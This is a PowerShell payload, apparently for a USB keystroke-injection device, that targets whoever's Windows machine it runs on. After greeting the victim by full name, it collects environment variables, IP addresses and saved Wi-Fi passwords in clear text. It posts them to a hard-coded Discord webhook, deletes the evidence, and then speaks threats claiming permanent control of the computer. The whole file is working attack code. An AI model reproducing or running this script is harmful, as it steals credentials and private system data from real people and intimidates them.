function Get-fullName {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$FN = Get-fullName

function Pause-Script{
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o=New-Object -ComObject WScript.Shell
    
        while (1) {
            $pauseTime = 1
            if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
                break
            }
            else {
                $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
            }
        }
    }
    
    Pause-Script

$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}  

$s=New-Object -ComObject SAPI.SpVoice
$s.Rate = -1
$s.Speak("Hello $FN")
$url="https://discord.com/api/webhooks/1000249230390210560/hkRygLboEnNrQwctU3vSB7ynhnFH69nRWscDvRD84qa3oeKYN_hXKtQP0QYKh_W06xLB";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;$Body=@{ content = "$env:computername Stats from Ducky/Pico"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt'
$s.Speak("Your computer has been hacked by Unknown Black Hat.")
$s.Speak("I know all about you $FN, so there is no where to go or hide")
$s.Speak("I have control over all your files, passwords, Etcetera")
Start-Process "https://www.dropbox.com/s/lsp5v2jrkzud3sd/signature.FucSocy.mov?dl=0"
$pauseTime = 2
$s.Speak("We are F Society. We are Free. We are one.")
$s.Speak("No need for a computer restart since im already in the system for good, but you can try.")
$s.Speak("Remember, i know who you are $fn, and i see you always...")
$s.Speak("Expect the Unknown Black Hat, and FUCK SOCIETY!")